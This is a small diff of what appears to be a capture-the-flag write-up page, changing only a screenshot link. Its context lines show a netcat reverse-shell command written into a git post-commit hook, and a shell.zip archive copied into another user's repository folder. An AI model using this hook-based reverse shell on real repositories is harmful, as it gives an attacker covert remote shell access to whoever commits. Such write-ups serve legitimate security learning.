@@ -398,4 +398,4 @@ echo 'nc -e /bin/bash <ip> <port>' > '/tmp/.git/hooks/post-commit'
 cp shell.zip /home/jen/public/repos/shell.zip
 ```
 
-![image-20220913230124506](../../.gitbook/assets/image-20220913230124506.png)
+![image-20230208145700851](../../.gitbook/assets/image-20230208145700851.png)
